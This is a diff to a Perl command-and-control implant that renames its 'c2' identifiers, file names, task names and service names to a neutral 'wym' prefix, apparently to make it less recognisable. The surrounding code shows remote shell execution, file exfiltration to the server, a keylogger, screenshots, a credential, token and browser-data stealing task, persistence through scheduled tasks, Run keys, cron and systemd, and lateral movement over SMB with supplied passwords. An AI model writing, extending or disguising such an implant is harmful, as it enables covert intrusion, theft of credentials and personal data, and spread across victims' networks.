@@ -10,14 +10,14 @@
 #                 --interval 5 --jitter 2 --verbose
 #
 # Environment variables (accepted when the flag is not given):
-#   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+#   WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 #
 # Flags:
-#   --server URL      server base URL (required unless C2_SERVER is set)
-#   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+#   --server URL      server base URL (required unless WYM_SERVER is set)
+#   --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
 #   --interval N      heartbeat interval in seconds (default 10, min 1)
 #   --jitter N        random jitter in seconds added to the interval
-#   --state FILE      state file persisting the agent id (default ~/.c2agent.json)
+#   --state FILE      state file persisting the agent id (default ~/.wymagent.json)
 #   --verbose         print activity to stdout
 #   -h, --help        show this help and exit
 #
@@ -37,16 +37,16 @@ use Getopt::Long;
 
 my $SHELL_TIMEOUT = 120;
 my $OUTPUT_LIMIT  = 12000;
-my $STATE_FILE    = File::Spec->catfile($ENV{HOME} || '.', '.c2agent.json');
+my $STATE_FILE    = File::Spec->catfile($ENV{HOME} || '.', '.wymagent.json');
 
 # ---------------------------------------------------------------- globals
 
 my $server   = '';
 my $token    = '';
 my $agent_id = '';
-my $interval = $ENV{C2_INTERVAL} || 10;
-my $jitter   = $ENV{C2_JITTER}   || 0;
-my $verbose  = ($ENV{C2_VERBOSE} && ($ENV{C2_VERBOSE} eq '1' || $ENV{C2_VERBOSE} eq 'true') ? 1 : 0);
+my $interval = $ENV{WYM_INTERVAL} || 10;
+my $jitter   = $ENV{WYM_JITTER}   || 0;
+my $verbose  = ($ENV{WYM_VERBOSE} && ($ENV{WYM_VERBOSE} eq '1' || $ENV{WYM_VERBOSE} eq 'true') ? 1 : 0);
 my $state_file = '';
 
 my %clones;  # target -> {status, last_check, relaunches, command, stop, interval}
@@ -115,16 +115,16 @@ sub winpath {
 
 # TLS certificate verification is ON when IO::Socket::SSL is available.
 # Operators using self-signed test certificates can opt out explicitly with
-# C2_INSECURE_TLS=1 (honoured by curl-based clients as well).
-my $OPTED_OUT_TLS = ($ENV{C2_INSECURE_TLS} // '') =~ /^(1|true|yes)$/i ? 1 : 0;
+# WYM_INSECURE_TLS=1 (honoured by curl-based clients as well).
+my $OPTED_OUT_TLS = ($ENV{WYM_INSECURE_TLS} // '') =~ /^(1|true|yes)$/i ? 1 : 0;
 my $VERIFY_SSL = 0;
 if ($OPTED_OUT_TLS) {
-    logmsg("TLS certificate verification disabled via C2_INSECURE_TLS=1");
+    logmsg("TLS certificate verification disabled via WYM_INSECURE_TLS=1");
 } else {
     $VERIFY_SSL = eval { require IO::Socket::SSL; 1 } ? 1 : 0;
 }
 my $http = HTTP::Tiny->new(
-    agent       => 'c2agent/1.0',
+    agent       => 'wymagent/1.0',
     timeout     => 15,
     verify_SSL  => $VERIFY_SSL,
 );
@@ -243,7 +243,7 @@ sub run_shell_win {
     local $ENV{C2BAT} = $batch;
     local $ENV{C2OUT} = $outf;
     local $ENV{C2TO}  = $timeout;
-    my $ps = File::Spec->catfile(File::Spec->tmpdir, "c2run_$$.ps1");
+    my $ps = File::Spec->catfile(File::Spec->tmpdir, "wymrun_$$.ps1");
     open my $pf, '>', $ps or return ("error: $!", 1);
     print $pf <<'PS';
 $b = $env:C2BAT; $o = $env:C2OUT; $t = [int]$env:C2TO
@@ -277,7 +277,7 @@ sub run_shell {
     logmsg("executing: $command");
 
     if ($^O eq 'MSWin32') {
-        my $bat = File::Spec->catfile(File::Spec->tmpdir, "c2run_$$.cmd");
+        my $bat = File::Spec->catfile(File::Spec->tmpdir, "wymrun_$$.cmd");
         open my $bfh, '>', $bat or return ("error: $!", 1);
         print $bfh '@echo off', "\r\n", $command, " 2>&1\r\nexit /b %ERRORLEVEL%\r\n";
         close $bfh;
@@ -374,7 +374,7 @@ sub task_upload {
     my $file_data = do { local $/; <$fh> };
     close $fh;
 
-    my $boundary = '----c2agent' . time();
+    my $boundary = '----wymagent' . time();
     my $filename = basename($path);
     my $body = "--$boundary\r\n"
              . "Content-Disposition: form-data; name=\"file\"; filename=\"$filename\"\r\n"
@@ -419,7 +419,7 @@ sub task_keylog {
 
 sub klog_base {
     my $dir = (os_name() eq 'windows') ? ($ENV{TEMP} || '.') : '/tmp';
-    return File::Spec->catfile($dir, ".c2keylog_$agent_id");
+    return File::Spec->catfile($dir, ".wymkeylog_$agent_id");
 }
 
 sub proc_alive {
@@ -470,7 +470,7 @@ PS
     open my $sh, '>', "$base.sh" or return;
     print $sh <<'SH';
 #!/bin/sh
-C2P=${C2P:-/tmp/.c2nope}; C2K=${C2K:-/tmp/.c2nope}
+C2P=${C2P:-/tmp/.wymnope}; C2K=${C2K:-/tmp/.wymnope}
 echo $$ > "$C2P"
 kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\1/')
 [ -z "$kid" ] && exit 1
@@ -593,14 +593,14 @@ sub task_screenshot {
 
     require File::Temp;
     my $tmpdir = $ENV{TEMP} || $ENV{TMPDIR} || '/tmp';
-    my ($fh, $tmp) = File::Temp::tempfile(File::Spec->catfile($tmpdir, 'c2shot_XXXXXX'), SUFFIX => '.png');
+    my ($fh, $tmp) = File::Temp::tempfile(File::Spec->catfile($tmpdir, 'wymshot_XXXXXX'), SUFFIX => '.png');
     close $fh;
 
     my $os = os_name();
     if ($os eq 'windows') {
         my $winpath = winpath($tmp);
         my $pspath = File::Spec->catfile($ENV{TEMP} || 'C:/Windows/Temp',
-                                         'c2shot_' . $$ . '.ps1');
+                                         'wymshot_' . $$ . '.ps1');
         $pspath = winpath($pspath);
         open my $pf, '>', $pspath or return ("error: cannot write screenshot script: $!", 1);
         print $pf "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;\r\n",
@@ -796,7 +796,7 @@ sub task_steal {
     $profile = 'all' unless $profile =~ /^(all|env|tokens|browser)$/;
 
     require File::Temp;
-    my $work = File::Temp::tempdir('c2steal_', TMPDIR => 1, CLEANUP => 0);
+    my $work = File::Temp::tempdir('wymsteal_', TMPDIR => 1, CLEANUP => 0);
     my @manifest;
 
     eval {
@@ -911,10 +911,10 @@ sub task_persistence {
     my ($destdir, $dest);
     if ($os eq 'windows') {
         $destdir = File::Spec->catdir($ENV{APPDATA} || $ENV{USERPROFILE} || '.',
-                                      'Microsoft', 'Windows', 'c2update');
-        $dest = File::Spec->catfile($destdir, 'c2agent.pl');
+                                      'Microsoft', 'Windows', 'wymupdate');
+        $dest = File::Spec->catfile($destdir, 'wymagent.pl');
     } else {
-        $destdir = File::Spec->catdir($ENV{HOME} || '.', '.config', 'c2update');
+        $destdir = File::Spec->catdir($ENV{HOME} || '.', '.config', 'wymupdate');
         $dest = File::Spec->catfile($destdir, $bname);
     }
     make_path($destdir) unless -d $destdir;
@@ -930,36 +930,36 @@ sub task_persistence {
     my $detail = '';
     if ($os eq 'windows') {
         my $progdata = $ENV{ProgramData} || $ENV{ALLUSERSPROFILE} || 'C:\ProgramData';
-        my $wrapper_dir = File::Spec->catdir($progdata, 'c2update');
+        my $wrapper_dir = File::Spec->catdir($progdata, 'wymupdate');
         make_path($wrapper_dir) unless -d $wrapper_dir;
-        my $wrapper = File::Spec->catfile($wrapper_dir, 'c2relaunch.cmd');
+        my $wrapper = File::Spec->catfile($wrapper_dir, 'wymrelaunch.cmd');
         open my $fh, '>:raw', $wrapper
             or return ('persistence error: could not write launcher: ' . $!, 1);
         print $fh "\@echo off\r\nstart \"\" /b $cmd\r\n";
         close $fh;
         $detail = "persistence: wrote launcher $wrapper";
-        if (system('schtasks', '/Create', '/TN', 'c2agent-persist', '/TR', $wrapper,
+        if (system('schtasks', '/Create', '/TN', 'wymagent-persist', '/TR', $wrapper,
                    '/SC', 'ONLOGON', '/RL', 'HIGHEST', '/F') == 0) {
             $ok = 1;
-            $detail .= "\nschtasks: scheduled ONLOGON (c2agent-persist)";
+            $detail .= "\nschtasks: scheduled ONLOGON (wymagent-persist)";
         } elsif (system('reg', 'add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
-                        '/v', 'c2agent', '/t', 'REG_SZ', '/d', $wrapper, '/f') == 0) {
+                        '/v', 'wymagent', '/t', 'REG_SZ', '/d', $wrapper, '/f') == 0) {
             $ok = 1;
-            $detail .= "\nreg: HKCU Run key set (c2agent)";
+            $detail .= "\nreg: HKCU Run key set (wymagent)";
         }
     } else {
-        my $cronout = `(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo '\@reboot $cmd # c2agent-persist') | crontab - 2>&1`;
+        my $cronout = `(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo '\@reboot $cmd # wymagent-persist') | crontab - 2>&1`;
         my $cr_ok = $cronout =~ /^\s*$/ ? 1 : 0;
-        $detail = $cr_ok ? 'crontab: @reboot hook installed (c2agent-persist)'
+        $detail = $cr_ok ? 'crontab: @reboot hook installed (wymagent-persist)'
                          : "crontab: " . (($cronout =~ s/\s+/ /gr) =~ s/^\s+|\s+$//gr);
-        my $unit = File::Spec->catfile($destdir, 'c2-update.service');
+        my $unit = File::Spec->catfile($destdir, 'wym-update.service');
         if (open my $uf, '>', $unit) {
-            print $uf "[Unit]\nDescription=c2 update\n\n[Service]\nType=simple\n"
+            print $uf "[Unit]\nDescription=wym update\n\n[Service]\nType=simple\n"
                     . "ExecStart=/bin/sh -c " . shell_escape($cmd) . "\n"
                     . "Restart=always\n\n[Install]\nWantedBy=default.target\n";
             close $uf;
         }
-        my $sctlmark = `systemctl --user daemon-reload >/dev/null 2>&1; if systemctl --user enable --now c2-update.service >/dev/null 2>&1; then echo __OK__; else echo __FAIL__; fi`;
+        my $sctlmark = `systemctl --user daemon-reload >/dev/null 2>&1; if systemctl --user enable --now wym-update.service >/dev/null 2>&1; then echo __OK__; else echo __FAIL__; fi`;
         my $sys_ok = $sctlmark =~ /__OK__/ ? 1 : 0;
         $detail .= "\nsystemctl: user unit failed" unless $sys_ok;
         $ok = $cr_ok || $sys_ok;
@@ -1011,10 +1011,10 @@ sub lateral_win_deploy {
         qx{net use "$share" /delete /y >NUL 2>&1};
         return "failed (copy: $err)";
     }
-    my $terr = qx{schtasks /Create /S $host /TN "c2agent-lateral" /TR "$share\\$bname" /SC ONLOGON /RU $user /RP "$pass" /RL HIGHEST /F 2>&1};
+    my $terr = qx{schtasks /Create /S $host /TN "wymagent-lateral" /TR "$share\\$bname" /SC ONLOGON /RU $user /RP "$pass" /RL HIGHEST /F 2>&1};
     my $trc = $? >> 8;
     qx{net use "$share" /delete /y >NUL 2>&1};
-    return "deployed (file dropped + scheduled c2agent-lateral)" if $trc == 0;
+    return "deployed (file dropped + scheduled wymagent-lateral)" if $trc == 0;
     my $err = ($terr =~ s/\s+/ /gr) =~ s/^\s+|\s+$//gr;
     return "deployed (file dropped; task: $err)";
 }
@@ -1051,8 +1051,8 @@ sub lateral_unix_deploy {
 sub task_lateral {
     my ($args) = @_;
     my $subnet = $args->{subnet} // '';
-    my $user = $args->{user} // ($ENV{C2_LAT_USER} // '');
-    my $pass = $args->{pass} // ($ENV{C2_LAT_PASS} // '');
+    my $user = $args->{user} // ($ENV{WYM_LAT_USER} // '');
+    my $pass = $args->{pass} // ($ENV{WYM_LAT_PASS} // '');
     my $own = local_ip();
     my $base = $subnet =~ /^(\d+\.\d+\.\d+)/ ? $1 : '';
     unless ($base) {
@@ -1071,7 +1071,7 @@ sub task_lateral {
         push @plist, $host;
         my $status;
         if (!$user && !$pass) {
-            $status = 'skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)';
+            $status = 'skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)';
             $skip++;
         } else {
             if ($os eq 'windows') {
@@ -1224,23 +1224,23 @@ GetOptions(
 if ($show_help) {
     print "usage: perl agent.pl --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n";
     print "\n";
-    print "Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):\n";
-    print "  --server URL      server base URL (required unless C2_SERVER is set)\n";
-    print "  --token TOKEN     shared agent token (required unless C2_TOKEN is set)\n";
+    print "Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):\n";
+    print "  --server URL      server base URL (required unless WYM_SERVER is set)\n";
+    print "  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)\n";
     print "  --interval N      heartbeat interval in seconds (default 10, min 1)\n";
     print "  --jitter N        random jitter in seconds added to the interval\n";
-    print "  --state FILE      state file persisting the agent id (default ~/.c2agent.json)\n";
+    print "  --state FILE      state file persisting the agent id (default ~/.wymagent.json)\n";
     print "  --verbose         print activity to stdout\n";
     print "  -h, --help        show this help and exit\n";
     exit(0);
 }
 
-$server = $ENV{C2_SERVER} // '' unless $server;
-$token  = $ENV{C2_TOKEN}  // '' unless $token;
+$server = $ENV{WYM_SERVER} // '' unless $server;
+$token  = $ENV{WYM_TOKEN}  // '' unless $token;
 if ($state_file) {
     $STATE_FILE = $state_file;
-} elsif ($ENV{C2_STATE_FILE}) {
-    $STATE_FILE = $ENV{C2_STATE_FILE};
+} elsif ($ENV{WYM_STATE_FILE}) {
+    $STATE_FILE = $ENV{WYM_STATE_FILE};
 }
 
 die "usage: perl agent.pl --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n"
